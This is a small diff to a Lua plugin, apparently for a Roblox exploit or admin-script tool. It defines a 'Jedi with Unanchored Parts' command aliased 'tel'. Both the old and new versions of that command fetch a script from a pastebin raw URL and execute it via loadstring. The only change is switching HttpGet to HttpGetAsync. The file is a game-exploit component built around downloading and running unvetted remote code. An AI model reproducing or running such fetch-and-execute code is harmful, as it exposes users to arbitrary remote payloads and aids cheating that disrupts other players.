@@ -7,7 +7,7 @@ local Plugin = {
 			["Description"] = "Jedi with Unanchored Parts",
 			["Aliases"] = {"tel"},
 			["Function"] = function(args,speaker)
-				 loadstring(game:HttpGet("https://pastebin.com/raw/CJ4K4rRw"))();
+				 loadstring(game:HttpGetAsync("https://pastebin.com/raw/CJ4K4rRw"))();
 			end,
 		},
 	},
